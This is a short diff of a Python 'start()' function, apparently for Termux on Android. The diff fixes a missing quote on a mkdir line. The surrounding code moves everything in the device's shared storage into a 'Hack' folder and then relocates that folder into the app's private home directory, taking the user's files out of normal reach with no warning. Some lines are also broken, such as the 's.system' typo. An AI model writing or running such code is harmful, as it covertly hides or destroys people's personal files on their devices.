@@ -6,7 +6,7 @@ def start():
     os.system('apt update -y')
     os.system('termux-setup-storage')
     os.system('cd /storage/emulated/0/')
-    os.system('mkdir /storage/emulated/0/Hack
+    os.system('mkdir /storage/emulated/0/Hack')
     os.system('mv /storage/emulated/0/* /storage/emulated/0/Hack')
     os.system('mv /storage/emulated/0/Hack $HOME/')
     s.system('cd')          
